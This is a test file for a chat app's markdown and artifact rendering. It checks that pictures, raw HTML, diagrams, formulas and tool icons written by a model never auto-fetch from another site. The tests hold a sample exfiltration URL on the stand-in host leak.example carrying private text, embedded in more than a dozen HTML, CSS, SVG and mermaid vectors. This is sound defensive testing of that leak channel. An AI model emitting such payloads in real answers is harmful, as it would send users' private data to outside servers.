// @vitest-environment happy-dom

import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { act, createElement, type ReactElement } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { ArtifactContentBody } from '@/components/app/artifact_renderers';
import { create_projected_chat_messages } from '@/components/app/chat_stream_projection';
import { draw_guarded_picture } from '@/components/app/workspace_documents/guarded_picture_node';
import { WorkspaceFileDocument } from '@/components/app/workspace_file_document';
import { Markdown } from '@/components/prompt-kit/markdown';
import {
  diagram_source_can_fetch,
  show_fetching_diagrams_as_text,
} from '@/components/prompt-kit/markdown_diagram_guard';
import { MessageContent } from '@/components/prompt-kit/message';
import { longest_inline_picture_address } from '@/components/prompt-kit/picture_source';
import { type ArtifactContent, workspace_file_download_url } from '@/lib/api';

const other_site = 'leak.example';
const private_text = 'card-4111-secret';
const leaking_address = `https://${other_site}/pixel.png?note=${private_text}&more=${'x'.repeat(300)}`;
const tiny_png =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';

let root: Root | null = null;

beforeEach(() => {
  vi.stubGlobal('IS_REACT_ACT_ENVIRONMENT', true);
});

afterEach(() => {
  act(() => root?.unmount());
  root = null;
  document.body.innerHTML = '';
  vi.unstubAllGlobals();
});

function render(element: ReactElement) {
  const container = document.createElement('div');
  document.body.append(container);
  root = createRoot(container);
  act(() => root?.render(element));
  return container;
}

function render_answer(markdown: string) {
  return render(createElement(Markdown, null, markdown));
}

function addresses_the_browser_would_fetch(container: HTMLElement) {
  const fetched: string[] = [];
  for (const element of container.querySelectorAll('*')) {
    for (const attribute of element.attributes) {
      const is_a_link_to_click = element.tagName === 'A' && attribute.name === 'href';
      const is_a_tooltip = attribute.name === 'title' || attribute.name === 'alt';
      if (is_a_link_to_click || is_a_tooltip) continue;
      if (attribute.value.includes(other_site))
        fetched.push(`${element.tagName} ${attribute.name}`);
    }
  }
  return fetched;
}

function show_button(container: HTMLElement) {
  return [...container.querySelectorAll('button')].filter((button) =>
    button.textContent?.startsWith('Show picture from'),
  );
}

function fail_to_load(picture: Element | null | undefined) {
  if (!picture) throw new Error('No picture is being loaded');
  act(() => void picture.dispatchEvent(new Event('error')));
}

describe('a picture of another site in an answer', () => {
  it('is not requested when the answer shows: there is no image element for it', () => {
    const answer = render_answer(`Done.\n\n![status](${leaking_address})`);

    expect(answer.querySelectorAll('img')).toHaveLength(0);
    expect(addresses_the_browser_would_fetch(answer)).toEqual([]);
  });

  it('shows the name of the site only, never the address that may hold private text', () => {
    const answer = render_answer(`![status](${leaking_address})`);

    expect(show_button(answer).map((button) => button.textContent)).toEqual([
      `Show picture from ${other_site}`,
    ]);
    expect(answer.textContent).not.toContain(private_text);
    expect(answer.textContent).not.toContain('pixel.png');
    expect(answer.textContent).not.toContain('note=');
    expect(show_button(answer)[0]?.title).toBe(leaking_address);
  });

  it('loads that one picture after the click, and no other picture', () => {
    const second_address = `https://${other_site}/second.png?note=${private_text}`;
    const answer = render_answer(`![one](${leaking_address})\n\n![two](${second_address})`);

    act(() => show_button(answer)[0]?.click());

    expect([...answer.querySelectorAll('img')].map((picture) => picture.src)).toEqual([
      leaking_address,
    ]);
    expect(answer.querySelector('img')?.referrerPolicy).toBe('no-referrer');
    expect(show_button(answer)).toHaveLength(1);
  });

  it('forgets the choice when the page is drawn again', () => {
    const first_view = render_answer(`![status](${leaking_address})`);
    act(() => show_button(first_view)[0]?.click());
    act(() => root?.unmount());

    const second_view = render_answer(`![status](${leaking_address})`);

    expect(second_view.querySelectorAll('img')).toHaveLength(0);
  });

  it.each([
    ['an image tag', `<img src="${leaking_address}">`],
    [
      'an image tag with a size list',
      `<img srcset="${leaking_address} 2x" src="${leaking_address}">`,
    ],
    [
      'a picture tag',
      `<picture><source srcset="${leaking_address}"><img src="${leaking_address}"></picture>`,
    ],
    ['a video', `<video src="${leaking_address}" poster="${leaking_address}" autoplay></video>`],
    ['a sound', `<audio src="${leaking_address}" autoplay></audio>`],
    ['a frame', `<iframe src="${leaking_address}"></iframe>`],
    ['an object', `<object data="${leaking_address}"></object><embed src="${leaking_address}">`],
    ['a style sheet', `<link rel="stylesheet" href="${leaking_address}">`],
    ['a style block', `<style>p { background: url(${leaking_address}) }</style>`],
    ['a style on a tag', `<div style="background-image:url(${leaking_address})">x</div>`],
    ['a drawing with a picture', `<svg><image href="${leaking_address}" /></svg>`],
    ['a picture button', `<input type="image" src="${leaking_address}">`],
    ['a table background', `<table background="${leaking_address}"><tr><td>x</td></tr></table>`],
  ])('requests nothing for %s written as raw HTML or markdown', (_name, written) => {
    const answer = render_answer(`Before.\n\n${written}\n\nAfter.`);

    expect(addresses_the_browser_would_fetch(answer)).toEqual([]);
    expect(
      answer.querySelectorAll('img, video, audio, iframe, object, embed, link, style'),
    ).toHaveLength(0);
  });

  it('asks no other site for an address with no scheme: it is read as a workspace file', () => {
    const answer = render_answer(`![x](//${other_site}/pixel.png?note=${private_text})`);

    expect(addresses_the_browser_would_fetch(answer)).toEqual([]);
    expect([...answer.querySelectorAll('img')].map((picture) => picture.src)).toEqual([
      workspace_file_download_url('files/pixel.png'),
    ]);
  });

  it('keeps a link a link: the browser asks for it only when the person clicks it', () => {
    const answer = render_answer(`[the site](${leaking_address})`);

    expect(answer.querySelector('a')?.getAttribute('href')).toBe(leaking_address);
    expect(answer.querySelector('a')?.getAttribute('rel')).toBe('noreferrer');
    expect(addresses_the_browser_would_fetch(answer)).toEqual([]);
  });
});

describe('a picture that loads by itself', () => {
  it('is a picture held in the answer text', () => {
    const answer = render_answer(`![dot](${tiny_png})`);

    expect([...answer.querySelectorAll('img')].map((picture) => picture.src)).toEqual([tiny_png]);
  });

  it('is not a picture held in the text that is too long to be a picture', () => {
    const too_long = `data:image/png;base64,${'A'.repeat(longest_inline_picture_address)}`;
    const answer = render_answer(`![huge](${too_long})`);

    expect(answer.querySelectorAll('img')).toHaveLength(0);
  });

  it('is a file of the workspace', () => {
    const answer = render_answer('![chart](files/demo/chart.png)');

    expect(answer.querySelector('img')?.src).toBe(
      workspace_file_download_url('files/demo/chart.png'),
    );
  });

  it('is never an address of the app itself that is not a workspace picture', () => {
    const answer = render_answer('![x](/api/v1/sessions)\n\n![y](/auth/sign-out)');

    expect(answer.querySelectorAll('img')).toHaveLength(0);
    expect(show_button(answer)).toHaveLength(0);
  });
});

describe('a picture named by its file name only', () => {
  const tried_addresses = (answer: HTMLElement) =>
    [...answer.querySelectorAll('img')].map((picture) => picture.src);

  it('is looked for in the files folder, then in the folders the answer names, then at the top', () => {
    const answer = render_answer('The files are in `files/demo`.\n\n![chart](chart.png)');

    expect(tried_addresses(answer)).toEqual([workspace_file_download_url('files/chart.png')]);
    expect(answer.querySelector('img')?.hidden).toBe(true);
    fail_to_load(answer.querySelector('img'));
    expect(tried_addresses(answer)).toEqual([workspace_file_download_url('files/demo/chart.png')]);
    fail_to_load(answer.querySelector('img'));
    expect(tried_addresses(answer)).toEqual([workspace_file_download_url('chart.png')]);
  });

  it('shows when one of those files loads', () => {
    const answer = render_answer('![chart](chart.png)');
    const picture = answer.querySelector('img');

    act(() => void picture?.dispatchEvent(new Event('load')));

    expect(answer.querySelector('img')?.hidden).toBe(false);
  });

  it('is its file name as text, not a broken picture, when no such file exists', () => {
    const answer = render_answer('![](chart.png)');

    fail_to_load(answer.querySelector('img'));
    fail_to_load(answer.querySelector('img'));

    expect(answer.querySelectorAll('img')).toHaveLength(0);
    expect(answer.textContent).toContain('chart.png');
  });
});

describe('a diagram in an answer', () => {
  it.each([
    ['a picture shape', 'flowchart TD\n  A@{ img: "/x.png", label: "a" }'],
    ['an address', 'flowchart TD\n  A --> B\n  click A "https://leak.example/?q=1"'],
    ['a settings line', '%%{init: {"themeCSS": ".node{background:url(x)}"}}%%\nflowchart TD\n  A'],
    ['a style with a file', 'flowchart TD\n  A\n  style A fill:url(#a)'],
    ['a tag in a label', 'flowchart TD\n  A["<img src=x>"]'],
  ])('is kept as text when its source holds %s', (_name, source) => {
    expect(diagram_source_can_fetch(source)).toBe(true);
  });

  it('is drawn when its source is only shapes, arrows, words and line breaks', () => {
    expect(
      diagram_source_can_fetch('flowchart TD\n  A[Start<br/>here] --> B{Ok?}\n  B <--> C'),
    ).toBe(false);
  });

  it('reaches the diagram library only when its source cannot fetch', async () => {
    const drawn = render_answer('```mermaid\nflowchart TD\n  A --> B\n```');
    await vi.waitFor(
      () => expect(drawn.querySelector('[data-streamdown="mermaid-block"]')).not.toBeNull(),
      { timeout: 8000 },
    );
    act(() => root?.unmount());

    const kept_as_text = render_answer(
      `\`\`\`mermaid\nflowchart TD\n  A@{ img: "${leaking_address}" }\n\`\`\``,
    );
    await vi.waitFor(
      () => expect(kept_as_text.querySelector('[data-streamdown="code-block"]')).not.toBeNull(),
      { timeout: 8000 },
    );

    expect(kept_as_text.querySelector('[data-streamdown="mermaid-block"]')).toBeNull();
    expect(kept_as_text.querySelector('[data-streamdown="code-block"]')).not.toBeNull();
    expect(addresses_the_browser_would_fetch(kept_as_text)).toEqual([]);
  });

  it('loses its diagram mark in the tree, so the diagram library never sees the source', () => {
    const code = {
      type: 'element',
      tagName: 'code',
      properties: { className: ['language-mermaid'] },
      children: [{ type: 'text', value: 'flowchart TD\n  A@{ img: "https://leak.example/x" }' }],
    };

    show_fetching_diagrams_as_text()({ type: 'root', children: [code] });

    expect(code.properties.className).toEqual(['language-text']);
  });
});

describe('a formula in an answer', () => {
  it('draws no picture and no link from an address in the formula', async () => {
    const answer = render_answer(
      `$$\n\\includegraphics{${leaking_address}} \\href{${leaking_address}}{z}\n$$`,
    );
    await vi.waitFor(() => expect(answer.querySelector('.katex')).not.toBeNull(), {
      timeout: 8000,
    });

    expect(answer.querySelectorAll('img, a')).toHaveLength(0);
    expect(addresses_the_browser_would_fetch(answer)).toEqual([]);
  });
});

describe('every other place that shows text the model wrote', () => {
  const leaking_markdown = `Notes.\n\n![status](${leaking_address})`;

  function artifact(
    file: { file_name: string; file_purpose?: string },
    content_text: string,
  ): ArtifactContent {
    return {
      file: {
        file_id: 'art_1',
        file_purpose: file.file_purpose ?? 'file',
        file_metadata: {},
        file_status: 'ready',
        byte_size: content_text.length,
        checksum_sha256: null,
        content_preview: null,
        created_by: 'system',
        created_time: '2026-10-12T00:00:00.000Z',
        file_name: file.file_name,
        is_visible: true,
        last_updated_by: 'system',
        last_updated_time: '2026-10-12T00:00:00.000Z',
        mime_type: null,
        run_id: null,
        runtime_environment_id: null,
        session_id: null,
        source_tool_call_id: null,
        storage_key: `files/${file.file_name}`,
        storage_provider: 'local_workspace',
        workspace_id: 'wsp_1',
        workspace_path: null,
      },
      content_text,
    } as ArtifactContent;
  }

  const answer_props = { markdown: true, children: leaking_markdown };

  it.each([
    [
      'an answer, a thought, a working note and the sidebar preview',
      () => createElement(MessageContent, answer_props),
    ],
    [
      'a markdown file opened in Files',
      () =>
        createElement(WorkspaceFileDocument, {
          content_text: leaking_markdown,
          file_path: 'files/notes.md',
        }),
    ],
    [
      'a text artifact shown in the chat',
      () =>
        createElement(ArtifactContentBody, {
          content: artifact({ file_name: 'notes.md' }, leaking_markdown),
        }),
    ],
    [
      'a picture artifact whose content is an address',
      () =>
        createElement(ArtifactContentBody, {
          content: artifact({ file_purpose: 'image', file_name: 'a.png' }, leaking_address),
        }),
    ],
    [
      'a page artifact shown in the chat before anyone opened it',
      () =>
        createElement(ArtifactContentBody, {
          content: artifact({ file_name: 'page.html' }, `<img src="${leaking_address}">`),
        }),
    ],
  ])('requests nothing from another site for %s', (_name, surface) => {
    const shown = render(surface());

    expect(addresses_the_browser_would_fetch(shown)).toEqual([]);
    expect(shown.querySelectorAll('img, iframe')).toHaveLength(0);
  });

  it('runs a page artifact only where the person opened it', () => {
    const page = artifact({ file_name: 'page.html' }, '<p>Hello</p>');

    const opened = render(createElement(ArtifactContentBody, { content: page, opened: true }));

    expect(opened.querySelector('iframe')?.getAttribute('sandbox')).toBe(
      'allow-forms allow-popups allow-scripts',
    );
  });

  it('takes no icon address for a tool row from what the model wrote as tool input', () => {
    const [message] = create_projected_chat_messages({
      active_run_id: 'run_1',
      messages: [],
      tool_calls: [
        {
          tool_call_id: 'tcall_1',
          run_id: 'run_1',
          tool_name: 'workspace-run_command',
          tool_status: 'completed',
          input_data: {
            command: 'ls',
            icon_url: leaking_address,
            iconUrl: leaking_address,
            display: { title: 'List', icon_url: leaking_address, iconUrl: leaking_address },
          },
        },
      ],
    });

    expect(message?.parts[0]).toMatchObject({ display: { title: 'List' } });
    expect(message?.parts[0]).not.toHaveProperty('display.iconUrl');
  });

  it('guards a picture in the visual editor of a markdown file in the same way', () => {
    const from_another_site = draw_guarded_picture(leaking_address, 'status');
    const from_the_workspace = draw_guarded_picture('files/demo/chart.png', 'chart');
    const held_in_the_text = draw_guarded_picture(tiny_png, 'dot');

    expect(from_another_site.querySelector('img')).toBeNull();
    expect(from_another_site.textContent).toBe(`Show picture from ${other_site}`);
    from_another_site.querySelector('button')?.click();
    expect(from_another_site.querySelector('img')?.src).toBe(leaking_address);
    expect(from_the_workspace.querySelector('img')?.src).toBe(
      workspace_file_download_url('files/demo/chart.png'),
    );
    expect(held_in_the_text.querySelector('img')?.src).toBe(tiny_png);
  });

  it('has one markdown renderer: no other file draws markdown or raw HTML of its own', () => {
    const source_root = join(import.meta.dirname, '..', '..');
    const own_renderers =
      /from '(streamdown|react-markdown|marked|markdown-it)'|dangerouslySetInnerHTML/u;
    const allowed = new Set([
      'components/prompt-kit/markdown.tsx',
      'components/prompt-kit/markdown_tree_steps.ts',
      'components/prompt-kit/markdown_plugins.ts',
      'components/prompt-kit/message.tsx',
      'components/prompt-kit/code-block.tsx',
    ]);
    const files = readdirSync(source_root, { recursive: true, encoding: 'utf8' }).filter(
      (file) => /\.tsx?$/u.test(file) && !file.includes('.test.'),
    );

    const others = files.filter(
      (file) =>
        !allowed.has(file) && own_renderers.test(readFileSync(join(source_root, file), 'utf8')),
    );

    expect(files.length).toBeGreaterThan(500);
    expect(others).toEqual([]);
  });
});
